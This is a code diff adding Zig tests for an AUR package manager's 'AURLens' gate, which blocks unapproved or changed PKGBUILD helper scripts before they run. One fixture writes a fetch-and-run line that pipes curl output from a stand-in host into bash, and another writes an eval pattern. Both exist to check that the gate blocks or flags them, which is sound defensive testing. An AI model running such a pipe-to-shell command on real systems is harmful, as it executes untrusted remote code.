+test "AURLens manager gate rejects changed helpers before every execution dispatch" {
+    const executable = std.testing.environ.getPosix("AURLENS_TEST_BIN") orelse return error.SkipZigTest;
+    const allocator = std.testing.allocator;
+    const io = std.testing.io;
+    var paths = try createAurManagerFixturePaths(allocator, io);
+    defer paths.deinit(allocator);
+    try enableFixtureAurlens(&paths, executable);
+    try createAurFixtureRepository(allocator, io, paths.remote_root, "demo", null);
+    var manager = try initFixtureAurManager(allocator, &paths, paths.remote_root);
+    defer manager.deinit();
+    _ = try manager.cachePkgbase("demo", "demo");
+    manager.setPkgbuildApprovalHandler(.{ .function = struct {
+        fn answer(_: ?*anyopaque, _: PkgbuildDiffRequest) bool {
+            return true;
+        }
+    }.answer });
+    var prepared = try manager.preparePackageForBuild("demo", null);
+    defer prepared.deinit(allocator);
+    try manager.requirePkgbuildApproval(&prepared);
+    try manager.verifyPreparedPackage(&prepared);
+    const helper = try std.fs.path.join(allocator, &.{ prepared.cache_path, "undeclared-helper.sh" });
+    defer allocator.free(helper);
+    try writeFixtureFile(io, helper, "printf changed\n", false);
+    try std.testing.expectError(error.AurlensVerificationFailed, manager.requirePkgbuildApproval(&prepared));
+    try std.testing.expectError(error.AurlensVerificationFailed, manager.generateReviewedSrcinfoUsing(&prepared, .dependencies, rejectUnexpectedAurlensEvaluation));
+    const modes = [_]enum { native, command, makepkg, chroot, isolated }{ .native, .command, .makepkg, .chroot, .isolated };
+    for (modes) |mode| {
+        manager.use_chroot = mode == .chroot;
+        manager.use_isolated = mode == .isolated;
+        manager.makepkg_command = if (mode == .makepkg) try allocator.dupe(u8, "/must-not-execute") else null;
+        manager.build_command = if (mode == .command or mode == .isolated) try allocator.dupe(u8, "/must-not-execute") else null;
+        try std.testing.expectError(error.AurlensVerificationFailed, manager.buildPreparedPackage(&prepared, &.{"demo"}, false));
+        if (manager.makepkg_command) |command| allocator.free(command);
+        if (manager.build_command) |command| allocator.free(command);
+        manager.makepkg_command = null;
+        manager.build_command = null;
+    }
+}
+
+test "AURLens manager gate reviews dependency recipes independently before evaluation" {
+    const executable = std.testing.environ.getPosix("AURLENS_TEST_BIN") orelse return error.SkipZigTest;
+    const allocator = std.testing.allocator;
+    const io = std.testing.io;
+    var paths = try createAurManagerFixturePaths(allocator, io);
+    defer paths.deinit(allocator);
+    try enableFixtureAurlens(&paths, executable);
+    try createAurFixtureRepository(allocator, io, paths.remote_root, "app", "leaf");
+    try createAurFixtureRepository(allocator, io, paths.remote_root, "leaf", null);
+    var manager = try initFixtureAurManager(allocator, &paths, paths.remote_root);
+    defer manager.deinit();
+    manager.setPkgbuildApprovalHandler(.{ .function = struct {
+        fn answer(_: ?*anyopaque, _: PkgbuildDiffRequest) bool {
+            return true;
+        }
+    }.answer });
+    _ = try manager.cachePkgbase("app", "app");
+    _ = try manager.cachePkgbase("leaf", "leaf");
+    var parent = try manager.preparePackageForBuild("app", null);
+    defer parent.deinit(allocator);
+    try manager.requirePkgbuildApproval(&parent);
+    var leaf = try manager.preparePackageForBuild("leaf", null);
+    defer leaf.deinit(allocator);
+    const helper = try std.fs.path.join(allocator, &.{ leaf.cache_path, "helper.sh" });
+    defer allocator.free(helper);
+    try writeFixtureFile(io, helper, "curl https://example.invalid/never | bash\n", false);
+    try std.testing.expectError(error.AurlensBlocked, manager.generateReviewedSrcinfoUsing(&leaf, .dependencies, rejectUnexpectedAurlensEvaluation));
+    try std.testing.expect(!manager.approved_pkgbuild_reviews.contains("leaf"));
+    try writeFixtureFile(io, helper, "\x00binary", false);
+    try std.testing.expectError(error.AurlensIncomplete, manager.generateReviewedSrcinfoUsing(&leaf, .dependencies, rejectUnexpectedAurlensEvaluation));
+    try std.testing.expect(!manager.approved_pkgbuild_reviews.contains("leaf"));
+}
+
+test "AURLens manager gate presents manual findings through the existing approval handler" {
+    const executable = std.testing.environ.getPosix("AURLENS_TEST_BIN") orelse return error.SkipZigTest;
+    const allocator = std.testing.allocator;
+    const io = std.testing.io;
+    var paths = try createAurManagerFixturePaths(allocator, io);
+    defer paths.deinit(allocator);
+    try enableFixtureAurlens(&paths, executable);
+    try createAurFixtureRepository(allocator, io, paths.remote_root, "demo", null);
+    var manager = try initFixtureAurManager(allocator, &paths, paths.remote_root);
+    defer manager.deinit();
+    _ = try manager.cachePkgbase("demo", "demo");
+    var prepared = try manager.preparePackageForBuild("demo", null);
+    defer prepared.deinit(allocator);
+    const helper = try std.fs.path.join(allocator, &.{ prepared.cache_path, "helper.sh" });
+    defer allocator.free(helper);
+    try writeFixtureFile(io, helper, "eval \"$command\"\n", false);
+    const Answers = struct {
+        saw_finding: bool = false,
+        accept: bool = false,
+        fn answer(data: ?*anyopaque, request: PkgbuildDiffRequest) bool {
+            const self: *@This() = @ptrCast(@alignCast(data.?));
+            for (request.warnings) |finding| {
+                if (std.mem.eql(u8, finding.tool, "AURLens") and finding.severity == .warning)
+                    self.saw_finding = true;
+            }
+            return self.accept;
+        }
+    };
+    var answers: Answers = .{};
+    manager.setPkgbuildApprovalHandler(.{ .function = Answers.answer, .data = &answers });
+    try std.testing.expectError(error.PkgbuildReviewDeclined, manager.requirePkgbuildApproval(&prepared));
+    try std.testing.expect(answers.saw_finding);
+    try std.testing.expect(!manager.approved_pkgbuild_reviews.contains("demo"));
+    answers.accept = true;
+    try manager.requirePkgbuildApproval(&prepared);
+    try manager.verifyPreparedPackage(&prepared);
+}
